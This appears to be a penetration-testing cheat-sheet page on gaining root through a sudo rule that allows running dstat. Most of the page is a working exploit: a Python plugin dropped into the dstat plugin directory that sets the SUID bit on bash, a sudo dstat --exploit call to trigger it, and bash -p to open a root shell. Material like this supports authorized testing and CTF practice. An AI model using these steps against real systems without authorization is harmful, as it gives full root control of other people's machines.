# Sudo Dstat Privilege Escalation

The `sudo dstat` command might be vulnerable to privilege escalation (PrivEsc).

**dstat** is a versatile tool for generating system resource statistics.\
It allows users to create a custom plugin and execute by adding option e.g. **`dstat --myplugin`**.

### Investigation <a href="#investigation" id="investigation"></a>

```
sudo -l

(ALL) NOPASSWD: /usr/bin/dstat
```

If we can execute **"dstat"** command as root, we can gain access to privileges by using our malicious plugin.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a New Dstat Plugin <a href="#id-1-create-a-new-dstat-plugin" id="id-1-create-a-new-dstat-plugin"></a>

First off, find locate the **"dstat"** directory.

```
find / -type d -name dstat 2>/dev/null
```

Assume the location of dstat is **“/usr/local/share/dstat”**.\
Create a plugin called **"dstat\_exploit.py"** under **"/usr/local/share/dstat/"**.

```
import os

os.system('chmod +s /usr/bin/bash')
```

dstat recognizes plugins under **"/usr/local/share/dstat/"**.\
Check if the above exploit plugin has been added by executing the following command.

```
dstat --list | grep exploit
```

#### 2. Execute Dstat with the Malicious Plugin <a href="#id-2-execute-dstat-with-the-malicious-plugin" id="id-2-execute-dstat-with-the-malicious-plugin"></a>

Now execute **"dstat"** with **“—exploit”** flag (the flag name is determined by the suffix of the file name e.g. **"dstat\_\\\<plugin-name>.py"**).

```
sudo /usr/bin/dstat --exploit
```

The exploit plugin executed so we enter bash as root.

```
bash -p
```
